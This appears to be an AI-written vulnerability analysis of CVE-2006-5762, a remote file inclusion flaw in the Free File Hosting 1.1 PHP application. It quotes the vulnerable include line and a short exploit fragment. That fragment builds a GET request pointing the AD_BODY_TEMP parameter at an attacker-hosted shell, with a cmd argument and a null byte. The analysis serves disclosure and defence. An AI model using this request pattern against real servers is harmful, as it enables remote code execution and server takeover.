Based on the provided information, here's an analysis of CVE-2006-5762:

**Vulnerability Details:**
*   **Root Cause:** The vulnerability is a Remote File Inclusion (RFI) flaw present in the "Free File Hosting 1.1" application. The application includes a file specified via the `AD_BODY_TEMP` parameter in multiple PHP files like `forgot_pass.php`, `contact.php`, `login.php`, `register.php`, and `send.php`.
*   **Weakness:** The application directly includes the file specified by a user-controlled parameter without sanitization or validation which is a classic example of a Remote File Inclusion vulnerability.
*   **Impact:** A remote attacker can inject arbitrary code into the server by including a malicious file, typically hosted on a remote server under the attacker's control. This allows for complete compromise of the web application and possibly the webserver, leading to data theft, modification or complete control of the server.
*   **Attack Vector:** The vulnerability is exploited by sending a crafted HTTP GET request to one of the vulnerable PHP files, with the `AD_BODY_TEMP` parameter set to a URL of a malicious PHP file controlled by the attacker.
*   **Required Capabilities:** The attacker needs to know the location of the vulnerable script and be able to host a malicious PHP file accessible from the vulnerable server. No authentication is required to exploit the vulnerability.

**Technical Details:**
The exploit works by manipulating the `AD_BODY_TEMP` parameter in the URL to point to a malicious PHP file hosted on an attacker controlled server. The vulnerable application includes this file, executing the arbitrary PHP code contained within the malicious file.

```php
// Example of vulnerable code in forgot_pass.php
<td><div align="center"><?php include($AD_BODY_TEMP);?></div></td>
```
This vulnerability is present in multiple files, not just in `forgot_pass.php`.

The provided exploit code for `forgot_pass.php` shows how an attacker can provide the URL of a malicious PHP file through the `AD_BODY_TEMP` parameter, and how the malicious file is then executed by the vulnerable script:

```
$packet ="GET ".$p."forgot_pass.php?AD_BODY_TEMP=".$shell."?cmd=".$cmd."%00 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
```

The exploit code uses the parameter `cmd` to send a system command to be executed by the included remote PHP file.

**Additional Notes:**
*   The provided exploit-db entry specifically mentions the affected version as "Free File Hosting 1.1".
*   The attrition.org entry confirms that the vulnerability is related to other CVEs (CVE-2006-5763, CVE-2006-5764) due to the presence of the same parameter `AD_BODY_TEMP` and vulnerable code patterns, suggesting that different versions or forks of the same software may be affected.
*   The exploit script in exploit-db uses a simple remote shell. The vulnerability could be used for various other types of malicious activity.

In summary, CVE-2006-5762 is a Remote File Inclusion vulnerability in "Free File Hosting 1.1" that allows an attacker to execute arbitrary code by including a malicious file hosted on a remote server. This can lead to a full compromise of the application and potentially the underlying server.
